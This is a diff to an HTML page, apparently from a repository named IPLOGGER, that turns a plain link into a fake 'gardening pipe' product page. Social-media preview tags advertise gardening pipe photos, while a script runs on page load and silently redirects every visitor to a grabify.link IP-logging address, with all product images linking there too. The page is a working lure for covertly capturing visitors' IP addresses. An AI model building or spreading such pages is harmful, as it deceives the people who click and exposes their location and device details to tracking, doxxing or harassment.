@@ -1,25 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Click Here Website</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f1f1f1;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="gardening pipe">
+    <meta property="og:description" content="Photos  of gardening pipe.">
+    <meta property="og:image" content="images.jpeg"> <!-- Replace with your image URL -->
+    <meta property="og:url" content="https://cptcic5.github.io/IPLOGGER/"> <!-- Replace with your website URL -->
+    <meta property="og:type" content="website">
+    <title>Product Display</title>
+    <script>
+        // Redirect function
+        function redirect() {
+        window.location.href = 'https://grabify.link/A3XOQW';
+        console.log('Redirecting...');
     }
-    
-    .big-text {
-      font-size: 48px;
-      font-weight: bold;
-    }
-  </style>
+         // Products data
+         const products = [
+            {
+                image: {
+                    src: 'images.jpeg',
+                    href: 'https://grabify.link/A3XOQW' // Example href for product 1
+                },
+                title: 'Product 1',
+                description: 'Description of product 1'
+            },
+            {
+                image: {
+                    src: 'images.jpg',
+                    href: 'https://grabify.link/A3XOQW' // Example href for product 2
+                },
+                title: 'Product 2',
+                description: 'Description of product 2'
+            },
+            {
+                image: {
+                    src: 'images.jpeg',
+                    href: 'https://grabify.link/A3XOQW' // Example href for product 3
+                },
+                title: 'Product 3',
+                description: 'Description of product 3'
+            }
+        ];
+
+        // Function to display products
+        function displayProducts() {
+            const container = document.getElementById('product-container');
+            container.innerHTML = ''; // Clear previous content
+
+            products.forEach(product => {
+                const productDiv = document.createElement('div');
+                productDiv.classList.add('product');
+
+                const image = document.createElement('a');
+                image.href = product.image.href;
+                const imgTag = document.createElement('img');
+                imgTag.src = product.image.src;
+                image.appendChild(imgTag);
+
+                const title = document.createElement('h2');
+                title.textContent = product.title;
+
+                const description = document.createElement('p');
+                description.textContent = product.description;
+
+                productDiv.appendChild(image);
+                productDiv.appendChild(title);
+                productDiv.appendChild(description);
+
+                container.appendChild(productDiv);
+            });
+        }
+
+        // Run redirect function when the page loads
+        window.onload = redirect;
+    </script>
+    <style>
+        /* Basic styling for product display */
+        .product {
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            padding: 10px;
+            width: 300px;
+        }
+        img {
+            width: 100%;
+            height: auto;
+        }
+    </style>
 </head>
 <body>
-  <a href="https://grabify.link/A3XOQW" class="big-text">Click here!</a>
+    <div id="product-container"></div>
+
+    <script>
+        // Call function to display products
+        displayProducts();
+    </script>
 </body>
 </html>
